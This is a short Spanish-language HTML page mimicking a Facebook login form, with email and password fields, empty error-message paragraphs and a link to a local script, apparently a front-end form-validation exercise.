<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Facebook - Login</title>
  <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
  <section class="user-data">
    <div class="data">
      <form action="" class="signup" id="form">
        <h2 class="form-signup-header">
          Facebook
        </h2>
        <div class="content-email" id="div-email">
          <label for="email" class="only-email">Email:</label><br/>
          <input type="email" id="email" class="complete-data" autofocus="" placeholder="Escribe aquí un e-mail válido">
          <p id="read-email" class="red"></p>
        </div>

        <div class="content-password" id="div-password">
          <label for="password" class="only-password">Password:</label><br/>
          <input type="password" id="password" autofocus="" placeholder="Escribe aquí tu password">
          <p id="read-password" class="red"></p>
        </div>

        <br/>
        <button id="login" class="button-submit" type="submit">Login</button>

      </form>
    </div>
  </section>
<script src="assets/js/app.js"></script>
</body>
</html>
